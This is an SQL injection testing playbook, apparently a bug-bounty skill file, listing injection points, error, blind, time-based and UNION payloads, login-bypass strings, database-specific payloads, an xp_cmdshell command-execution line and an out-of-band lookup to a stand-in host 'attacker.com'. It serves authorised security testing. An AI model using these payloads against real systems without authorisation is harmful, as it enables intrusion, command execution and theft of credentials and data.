# SQL Injection Testing Playbook

## Overview
SQL Injection — inserting malicious SQL code into queries through unsanitized input.

## Testing Approach

### 1. Identify Injection Points
- Search parameters (`?q=`)
- POST body parameters
- Headers (User-Agent, X-Forwarded-For, etc.)
- Cookies

### 2. Detection Methods

**Error-Based**
```sql
' 
" 
OR 1=1--
AND 1=2--
```

**Boolean-Based (Blind)**
```sql
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--
```

**Time-Based**
```sql
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--
```

### 3. UNION-Based
```sql
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
' UNION SELECT table_name FROM information_schema.tables--
```

## Common Vulnerable Patterns

### Login Bypass
```sql
admin'--
admin' OR '1'='1
' OR 1=1--
```

### Data Extraction
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,NULL,NULL--
```

### Out-of-Band
```sql
'; EXEC xp_cmdshell 'nslookup attacker.com'--
```

## Testing Workflow

1. **Identify inputs** — find all user-controlled parameters
2. **Quick test** — add `'` and check for errors
3. **Boolean test** — `1=1` vs `1=2` to confirm injection
4. **Examine error messages** — SQL syntax errors reveal DB type
5. **Escalate** — UNION, time-based, or blind techniques
6. **Confirm with types** — ensure you can extract data

## DB-Specific Payloads

### MySQL
```sql
' OR 1=1--
' UNION SELECT NULL--
' AND SLEEP(5)--
```

### PostgreSQL
```sql
'; SELECT pg_sleep(5)--
' OR 1=1--
```

### MSSQL
```sql
'; WAITFOR DELAY '00:00:05'--
'; EXEC xp_cmdshell 'dir'--
```

### SQLite
```sql
' OR 1=1--
' AND 1=2--
```

## Findings Format

```
## SQLi Finding
- **Type**: Error-Based / Blind / UNION / Out-of-Band
- **URL**: https://target.com/endpoint
- **Parameter**: q
- **Payload**: ' OR SLEEP(5)--
- **DB Type**: MySQL (from error messages)
- **Data Extracted**: Yes/No (if UNION worked)
```

## Files to Update
After finding SQLi, write to:
```
~/Shared/bounty_recon/{program}/ghost/skills/sqli/findings.md
```

**IMPORTANT**: Only confirm with non-destructive tests. Do not extract data.
